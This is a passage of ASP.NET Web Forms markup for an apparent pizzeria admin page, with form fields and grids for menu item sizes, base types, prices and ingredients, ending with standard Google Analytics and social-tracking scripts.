                                                                                <asp:ListItem Selected="True" Value="-1">Select Menu Item Size</asp:ListItem>
                                                                            </asp:DropDownList>


                                                                        </div>
                                                                    </div>
                                                                    <div class="form-group">
                                                                        <label class="col-sm-2 control-label">Pizza Base Type</label>
                                                                        <div class="col-sm-10">
                                                                            <asp:DropDownList ID="DdlPizzaBaseType" runat="server" AutoPostBack="false" AppendDataBoundItems="True" CssClass="form-control" ValidationGroup="Popup">
                                                                                <asp:ListItem Selected="True" Value="-1">Select Pizza Base Type</asp:ListItem>
                                                                            </asp:DropDownList>


                                                                        </div>
                                                                    </div>
                                                                    <div class="form-group">

                                                                        <label class="col-sm-2 control-label">Menu Item Making Method</label>
                                                                        <div class="col-sm-10">
                                                                            <asp:DropDownList ID="DdlMakingMethod" runat="server" AutoPostBack="false" AppendDataBoundItems="True" CssClass="form-control" ValidationGroup="Popup">
                                                                                <asp:ListItem Selected="True" Value="-1">Select Menu Item Making Method</asp:ListItem>
                                                                            </asp:DropDownList>


                                                                        </div>
                                                                    </div>

                                                                    <div class="form-group">

                                                                        <label class="col-sm-2 control-label">Properties Price</label>
                                                                        <div class="col-sm-10">
                                                                            <asp:TextBox ID="txtPopupPropertiesPrice" runat="server" CssClass="form-control" ValidationGroup="Popup"></asp:TextBox>
                                                                            <asp:RegularExpressionValidator ID="RegularExpressionValidator1" ControlToValidate="txtPopupPropertiesPrice" runat="server" ErrorMessage="Only Integers and Decimal values are allowed" ValidationExpression="((\d+)((\.\d{1,2})?))$" ForeColor="Red" Style="margin-left: 3px;" ValidationGroup="Popup"></asp:RegularExpressionValidator>
                                                                        </div>
                                                                    </div>

                                                                    <div class="form-group">

                                                                        <label class="col-sm-2 control-label">1st Price Group</label>
                                                                        <div class="col-sm-10">
                                                                            <asp:TextBox ID="txtSingleIngredientsPrice" runat="server" CssClass="form-control" ValidationGroup="Popup"></asp:TextBox>
                                                                            <asp:RegularExpressionValidator ID="RegularExpressionValidator2" ControlToValidate="txtSingleIngredientsPrice" runat="server" ErrorMessage="Only Integers and Decimal values are allowed" ValidationExpression="((\d+)((\.\d{1,2})?))$" ForeColor="Red" Style="margin-left: 3px;" ValidationGroup="Popup"></asp:RegularExpressionValidator>
                                                                        </div>
                                                                    </div>

                                                                    <div class="form-group">

                                                                        <label class="col-sm-2 control-label">2nd Price Group</label>
                                                                        <div class="col-sm-10">
                                                                            <asp:TextBox ID="txtDoubleIngredientsPrice" runat="server" CssClass="form-control" ValidationGroup="Popup"></asp:TextBox>
                                                                            <asp:RegularExpressionValidator ID="RegularExpressionValidator4" ControlToValidate="txtDoubleIngredientsPrice" runat="server" ErrorMessage="Only Integers and Decimal values are allowed" ValidationExpression="((\d+)((\.\d{1,2})?))$" ForeColor="Red" Style="margin-left: 3px;" ValidationGroup="Popup"></asp:RegularExpressionValidator>
                                                                        </div>
                                                                    </div>

                                                                    <div>
                                                                        <asp:Button ID="BtnAddProperties" Text="Add Properties" runat="server" OnClick="BtnAddProperties_Click" ValidationGroup="Popup" OnClientClick="ValidateAndShowPopup()" CausesValidation="true" CssClass="btn btn-info" />&nbsp;
                                                        <asp:Button ID="btnClose" Text="Close" runat="server" OnClick="btnClose_Click" OnClientClick="return true;" CssClass="btn btn-info" />

                                                                    </div>
                                                                </div>
                                                            </div>
                                                        </div>


                                                        <div class="form-group" id="Propertiesdiv">
                                                            <div class="col-sm-10">
                                                                <asp:GridView ID="gvMenuItemPropertiesInformation" ShowHeaderWhenEmpty="True" runat="server" Style="margin-left: 20px;" AutoGenerateColumns="false" autopostback="false" OnRowCommand="gvMenuItemPropertiesInformation_RowCommand" class="table table-bordered table-striped datatable editable-datatable responsive align-middle bordered" HeaderStyle-CssClass="grid">
                                                                    <HeaderStyle HorizontalAlign="Center" />
                                                                    <RowStyle HorizontalAlign="Center" />


                                                                    <Columns>

                                                                        <asp:TemplateField Visible="false">
                                                                            <ItemTemplate>
                                                                                <asp:Label ID="lblPropertiesId" runat="server" Text='<%# Eval("PropertiesId") %>'></asp:Label>
                                                                            </ItemTemplate>
                                                                        </asp:TemplateField>
                                                                        <asp:TemplateField Visible="false">
                                                                            <ItemTemplate>
                                                                                <asp:Label ID="lblSizeId" runat="server" Text='<%# Eval("SizeId") %>'></asp:Label>
                                                                            </ItemTemplate>
                                                                        </asp:TemplateField>

                                                                        <asp:TemplateField HeaderText="Menu Item Size" ItemStyle-HorizontalAlign="Center">
                                                                            <ItemTemplate>
                                                                                <asp:Label ID="lblMenuItemSize" runat="server" Text='<%# Eval("SizeName") %>' Width="100px"></asp:Label>
                                                                            </ItemTemplate>
                                                                        </asp:TemplateField>
                                                                        <asp:TemplateField Visible="false">
                                                                            <ItemTemplate>
                                                                                <asp:Label ID="lblPizzaBaseTypeId" runat="server" Text='<%# Eval("PizzaBaseTypeId") %>'></asp:Label>
                                                                            </ItemTemplate>
                                                                        </asp:TemplateField>
                                                                        <asp:TemplateField HeaderText="Base type">
                                                                            <ItemTemplate>
                                                                                <asp:Label ID="lblPizzaBaseType" runat="server" Text='<%# Eval("PizzaBaseType") %>' Width="100px"></asp:Label>
                                                                            </ItemTemplate>
                                                                        </asp:TemplateField>
                                                                        <asp:TemplateField Visible="false">
                                                                            <ItemTemplate>
                                                                                <asp:Label ID="lblMakingMethodId" runat="server" Text='<%# Eval("MakingMethodId") %>'></asp:Label>
                                                                            </ItemTemplate>
                                                                        </asp:TemplateField>
                                                                        <asp:TemplateField HeaderText="Menu Item Making Method">
                                                                            <ItemTemplate>
                                                                                <asp:Label ID="lblMenuItemMakingMethod" runat="server" Text='<%# Eval("MakingMethodName") %>' Width="100px"></asp:Label>
                                                                            </ItemTemplate>
                                                                        </asp:TemplateField>

                                                                        <asp:TemplateField HeaderText="Properties Price">
                                                                            <ItemTemplate>
                                                                                <%--<asp:TextBox ID="txtPropertiesPrice" runat="server" Width="100px" Style="text-align: center"></asp:TextBox>--%>
                                                                                <asp:Label ID="lblPropertiesPrice" runat="server" Text='<%# "$ " + Eval("PropertiesPrice")%>'></asp:Label>
                                                                            </ItemTemplate>
                                                                        </asp:TemplateField>

                                                                        <asp:TemplateField HeaderText="1st Price Group">
                                                                            <ItemTemplate>
                                                                                <%--<asp:TextBox ID="txtPropertiesPrice" runat="server" Width="100px" Style="text-align: center"></asp:TextBox>--%>
                                                                                <asp:Label ID="lblSingleToppingsPrice" runat="server" Text='<%# "$ " + Eval("SingleIngredientsPrice")%>'></asp:Label>
                                                                            </ItemTemplate>
                                                                        </asp:TemplateField>

                                                                        <asp:TemplateField HeaderText="2nd Price Group">
                                                                            <ItemTemplate>
                                                                                <%--<asp:TextBox ID="txtPropertiesPrice" runat="server" Width="100px" Style="text-align: center"></asp:TextBox>--%>
                                                                                <asp:Label ID="lblDoubleTopingsPrice" runat="server" Text='<%# "$ " + Eval("DoubleIngredientsPrice")%>'></asp:Label>
                                                                            </ItemTemplate>
                                                                        </asp:TemplateField>

                                                                        <%-- <asp:CommandField ShowEditButton ="true" ButtonType="Button" HeaderText="Edit" />
                            <asp:CommandField ShowDeleteButton="True" ButtonType="Button" HeaderText="Delete" />--%>

                                                                        <asp:TemplateField HeaderText="Edit">
                                                                            <ItemTemplate>
                                                                                <asp:LinkButton ID="lnkEdit" runat="server" CommandName="EditProperties" Text="Edit" OnClientClick="return true;" CommandArgument='<%# Eval("PropertiesId") %>'></asp:LinkButton>
                                                                            </ItemTemplate>
                                                                        </asp:TemplateField>

                                                                        <asp:TemplateField HeaderText="Delete">
                                                                            <ItemTemplate>
                                                                                <asp:LinkButton ID="lnkDelete" runat="server" CommandName="DeleteProperties" Text="Delete" CommandArgument='<%# Eval("PropertiesId") %>' OnClientClick="Confirm()"></asp:LinkButton>
                                                                            </ItemTemplate>
                                                                        </asp:TemplateField>
                                                                    </Columns>
                                                                    <EmptyDataRowStyle HorizontalAlign="Center" />
                                                                    <EmptyDataTemplate>
                                                                        No Menu Item Properties Found

                                                                    </EmptyDataTemplate>
                                                                </asp:GridView>

                                                                <br />
                                                                &nbsp;
                                                            </div>
                                                        </div>
                                                    </div>
                                                </div>
                                            </ContentTemplate>
                                        </asp:UpdatePanel>

                                        <div class="form-group">

                                            <div class="col-sm-10">
                                                <asp:Label ID="lblIngredientDressingHeader" runat="server" Text="Ingredient/Dressing Detail" Style="margin-left: -5px; font-size: 14px;" Font-Bold="true"></asp:Label>
                                            </div>

                                            <div class="form-group" id="Ingreditndiv">
                                                <div class="col-sm-10" style="width: 80%; height: 500px; overflow-y: scroll; overflow-x: hidden;">
                                                    <asp:UpdatePanel ID="upToppingDetails" runat="server">
                                                        <ContentTemplate>
                                                            <asp:GridView ID="gvMenuItemIngredientInformation" runat="server" Width="80%" AutoGenerateColumns="false" Style="margin-left: 218px; margin-top: 10px;" class="table table-bordered table-striped datatable editable-datatable responsive align-middle bordered">

                                                                <RowStyle HorizontalAlign="Center" />
                                                                <Columns>



                                                                    <asp:TemplateField Visible="false" HeaderStyle-Width="5%">
                                                                        <ItemTemplate>
                                                                            <asp:Label ID="lblIngredientId" runat="server" Text='<%# Eval("IngredientId") %>'></asp:Label>
                                                                        </ItemTemplate>
                                                                    </asp:TemplateField>

                                                                    <asp:TemplateField HeaderText="Ingredient/Dressing Name" HeaderStyle-Width="39%">
                                                                        <%--<HeaderTemplate>
                                                                    <asp:Label ID="lblIngredientNameHeader" runat="server" Text="Ingredient/Dressing Name" Width="100px"></asp:Label>
                                                                </HeaderTemplate>--%>
                                                                        <ItemTemplate>
                                                                            <asp:Label ID="lblIngredientName" runat="server" Text='<%# Eval("IngredientName") %>' Width="100px"></asp:Label>
                                                                        </ItemTemplate>
                                                                    </asp:TemplateField>

                                                                    <asp:TemplateField HeaderText="Ingredient/Dressing Price" HeaderStyle-Width="39%" Visible="false">
                                                                        <%-- <HeaderTemplate>
                                                                    <asp:Label ID="lblIngredientPriceHeader" runat="server" Text="Ingredient/Dressing Price" Width="100px"></asp:Label>
                                                                </HeaderTemplate>--%>
                                                                        <ItemTemplate>
                                                                            <%--<asp:TextBox ID="txtIngredientPrice" runat="server" Width="100px" Style="text-align: center"></asp:TextBox>--%>

                                                                            <asp:Label ID="lblIngredientPrice" runat="server" Text='<%# "$ " + Eval("IngredientPrice")%>'></asp:Label>
                                                                        </ItemTemplate>
                                                                    </asp:TemplateField>

                                                                    <asp:TemplateField HeaderText="Defult Ingredient/Dressing" HeaderStyle-Width="1%" Visible="false">
                                                                        <%-- <HeaderTemplate>
                                                                    <asp:Label ID="lblIngredientDefaultHeader" runat="server" Text="Defult Ingredient/Dressing" Width="100px"></asp:Label>
                                                                </HeaderTemplate>--%>
                                                                        <ItemTemplate>
                                                                            <asp:UpdatePanel ID="upDefaultIngredients" runat="server">
                                                                                <ContentTemplate>
                                                                                    <asp:CheckBox ID="chkDefultIngredient" runat="server" Text="" Width="10px" />
                                                                                </ContentTemplate>
                                                                            </asp:UpdatePanel>
                                                                        </ItemTemplate>
                                                                    </asp:TemplateField>
                                                                    <asp:TemplateField HeaderText="Extra Ingredient/Dressing" HeaderStyle-Width="1%" Visible="false">
                                                                        <%--<HeaderTemplate>
                                                                    <asp:Label ID="lblIngredientExtraHeader" runat="server" Text="Extra Ingredient/Dressing" Width="100px"></asp:Label>
                                                                </HeaderTemplate>--%>
                                                                        <ItemTemplate>
                                                                            <asp:CheckBox ID="chkExtraIngredient" runat="server" Text="" Width="10px" />
                                                                        </ItemTemplate>
                                                                    </asp:TemplateField>

                                                                    <asp:TemplateField HeaderText="1st Price Group" HeaderStyle-Width="1%">
                                                                        <%-- <HeaderTemplate>
                                                                    <asp:Label ID="lblIngredientDefaultHeader" runat="server" Text="Defult Ingredient/Dressing" Width="100px"></asp:Label>
                                                                </HeaderTemplate>--%>
                                                                        <ItemTemplate>
                                                                            <%-- <asp:RadioButton ID="rdbSingleIngredients" runat="server" GroupName="Ingredients"/>--%>
                                                                            <asp:CheckBox ID="rdbSingleIngredients" runat="server" Text="" Width="10px" OnCheckedChanged="rdbSingleIngredients_CheckedChanged" AutoPostBack="true" />
                                                                        </ItemTemplate>
                                                                    </asp:TemplateField>
                                                                    <asp:TemplateField HeaderText="2nd Price Group" HeaderStyle-Width="1%">
                                                                        <%--<HeaderTemplate>
                                                                    <asp:Label ID="lblIngredientExtraHeader" runat="server" Text="Extra Ingredient/Dressing" Width="100px"></asp:Label>
                                                                </HeaderTemplate>--%>
                                                                        <ItemTemplate>
                                                                            <%--<asp:RadioButton ID="rdbDoubleIngredients" runat="server" GroupName="Ingredients" />--%>
                                                                            <asp:CheckBox ID="rdbDoubleIngredients" runat="server" Text="" Width="10px" OnCheckedChanged="rdbDoubleIngredients_CheckedChanged" AutoPostBack="true" />
                                                                        </ItemTemplate>
                                                                    </asp:TemplateField>

                                                                </Columns>

                                                            </asp:GridView>
                                                        </ContentTemplate>
                                                    </asp:UpdatePanel>
                                                </div>
                                            </div>

                                        </div>

                                        <div class="form-group">

                                            <div class="col-sm-10">
                                                <asp:Label runat="server" Text="Ingredient/Dressing Fact Detail" Style="margin-left: -5px; font-size: 14px;" Font-Bold="true"></asp:Label>
                                            </div>


                                            <div class="form-group" id="IngreditFactndiv">
                                                <div class="col-sm-10" style="width: 50%;">
                                                    <asp:GridView ID="gvIngredientFactDetail" runat="server" AutoGenerateColumns="false" Style="margin-left: 218px; margin-top: 10px;" class="table table-bordered table-striped datatable editable-datatable responsive align-middle bordered">
                                                        <HeaderStyle HorizontalAlign="Center" />
                                                        <RowStyle HorizontalAlign="Center" />
                                                        <Columns>

                                                            <asp:TemplateField HeaderText="">
                                                                <ItemTemplate>
                                                                    <asp:CheckBox ID="chkingredientfact" runat="server" Text="" Width="10px" />
                                                                </ItemTemplate>
                                                            </asp:TemplateField>

                                                            <asp:TemplateField Visible="false">
                                                                <ItemTemplate>
                                                                    <asp:Label ID="lblIngredientFactId" runat="server" Text='<%# Eval("IngredientFactId") %>'></asp:Label>
                                                                </ItemTemplate>
                                                            </asp:TemplateField>

                                                            <asp:TemplateField HeaderText="Ingredient/Dressing Fact Name">
                                                                <ItemTemplate>
                                                                    <asp:Label ID="lblIngredientFactName" runat="server" Text='<%# Eval("IngredientFactName") %>' Width="100px"></asp:Label>
                                                                </ItemTemplate>
                                                            </asp:TemplateField>


                                                        </Columns>

                                                    </asp:GridView>


                                                </div>

                                            </div>
                                        </div>

                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                    <asp:Button ID="btnAddMenuItem" CssClass="btn btn-info" runat="server" Text="Add Menu Item" OnClick="btnAddMenuItem_Click" ValidationGroup="V1" />

                    <asp:Button ID="btnCancel" CssClass="btn btn-info" runat="server" Text="Cancel" OnClick="btnCancel_Click" CausesValidation="false" />
                </div>
            </div>


            <footer class="content-footer">
                <nav class="footer-right">
                    <ul class="nav">
                        <li><a href="javascript:;">Top</a> </li>
                        <li><a href="javascript:;" class="scroll-up"><i class="fa fa-angle-up"></i></a></li>
                    </ul>
                </nav>

                <nav class="footer-left">
                    <ul class="nav">
                        <li><a href="javascript:;">Copyright <i class="fa fa-copyright"></i><span>TomatosPizzeria</span> 2016. All rights reserved</a> </li>
                    </ul>
                </nav>
            </footer>

        </div>
        <script src="js/app.min.4fc8dd6e.js"></script>
        <script src="js/jquery.dataTables.js"></script>
        <script src="js/bootstrap-datatables.8df42543.js"></script>
        <script type="text/javascript">
            /* <![CDATA[ */
            var _gaq = _gaq || [];
            _gaq.push(['_setAccount', 'UA-50530436-1']);
            _gaq.push(['_trackPageview']);

            (function () {
                var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
                ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
                var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
            })();

            (function (b) { (function (a) { "__CF" in b && "DJS" in b.__CF ? b.__CF.DJS.push(a) : "addEventListener" in b ? b.addEventListener("load", a, !1) : b.attachEvent("onload", a) })(function () { "FB" in b && "Event" in FB && "subscribe" in FB.Event && (FB.Event.subscribe("edge.create", function (a) { _gaq.push(["_trackSocial", "facebook", "like", a]) }), FB.Event.subscribe("edge.remove", function (a) { _gaq.push(["_trackSocial", "facebook", "unlike", a]) }), FB.Event.subscribe("message.send", function (a) { _gaq.push(["_trackSocial", "facebook", "send", a]) })); "twttr" in b && "events" in twttr && "bind" in twttr.events && twttr.events.bind("tweet", function (a) { if (a) { var b; if (a.target && a.target.nodeName == "IFRAME") a: { if (a = a.target.src) { a = a.split("#")[0].match(/[^?=&]+=([^&]*)?/g); b = 0; for (var c; c = a[b]; ++b) if (c.indexOf("url") === 0) { b = unescape(c.split("=")[1]); break a } } b = void 0 } _gaq.push(["_trackSocial", "twitter", "tweet", b]) } }) }) })(window);
            /* ]]> */
        </script>
    </form>
</body>
</html>
